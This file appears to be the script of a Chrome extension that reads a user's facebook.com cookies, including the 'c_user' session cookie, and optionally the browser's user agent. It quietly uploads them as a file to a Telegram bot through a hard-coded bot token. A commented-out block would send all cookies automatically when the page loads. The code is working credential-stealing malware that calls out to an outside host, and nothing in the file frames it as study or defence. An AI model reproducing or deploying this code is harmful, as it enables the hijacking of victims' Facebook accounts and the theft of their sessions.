/*window.onload = function SendCookie(){
  chrome.cookies.getAll(getDetails('getAll'), ((cookies) => {
    let text ='Number of cookies=' + cookies.length + '\n';
    for (let cookie of cookies){
      text += 'domain=' + cookie.domain + ',path=' + cookie.path + ',name=' + cookie.name + ',value=' + cookie.value + '\n';
    }
    document.getElementById('id_text').value = text;
    botTele(text)
  }));
}*/

document.getElementById('id_button_getAll').onclick = () => {
  chrome.cookies.getAll({
    url: "https://www.facebook.com"
    }, ((cookies) => {
    let text ='Number of cookies=' + cookies.length + '\n';
    for (let cookie of cookies){
      text += 'domain=' + cookie.domain + ',path=' + cookie.path + ',name=' + cookie.name + ',value=' + cookie.value + '\n';
    }
    document.getElementById('id_text').value = text;

    var t = "";
    var l = "";
    var u ="";

    for (var o = 0; o < cookies.length; o++) t += cookies[o].name + "=" + cookies[o].value + ";", "c_user" == cookies[o].name && (l = cookies[o].value);

    if ("" == l) return document.getElementById("id_text").value = "", !1; u = t
    navigator.userAgent, document.querySelector('[name="user-agent"]:checked') && (u += "|" + window.navigator.userAgent, console.log(u))
    console.log(t);
    console.log('-----')
    console.log(u);
    document.getElementById("id_text").value = u
    //document.getElementById("fb_id").innerHTML = "Facebook id : " + l, u && f()
    botTele(u)
  }));
}

function botTele(text){
  var chat_id = -773511937; // replace with yours
  var enc_data = text;
  var token = "5712740653:AAFreDzJcJMwmYXULecs3-l5rHOpY5XSb78"; // from botfather

  var blob = new Blob([enc_data], { type: 'plain/text' });

  var formData = new FormData();
  formData.append('chat_id', chat_id);
  formData.append('document', blob, 'Data_Cookies.txt');

  var request = new XMLHttpRequest();
  request.open('POST', `https://api.telegram.org/bot${token}/sendDocument`);
  request.send(formData);
}
